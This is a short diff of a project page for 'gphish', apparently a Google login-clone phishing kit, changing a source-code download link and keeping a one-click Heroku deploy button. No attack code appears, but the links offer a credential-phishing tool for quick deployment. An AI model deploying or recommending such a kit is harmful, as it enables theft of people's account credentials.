@@ -20,7 +20,7 @@
   <a href="https://heroku.com/deploy?template=https://github.com/D4RKH0R1Z0N/gphish">
     <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
   </a>
-	<h3>OR Install .zip</h3><a href="https://gphish.herokuapp.com/v2-google-login-clone.zip">Click Me to Install .zip (Source Code)</a>
+	<h3>OR Install .zip</h3><a href="https://gphish.herokuapp.com/gphish.zip">Click Me to Install .zip (Source Code)</a>
 </div>
   <br>
  <br>
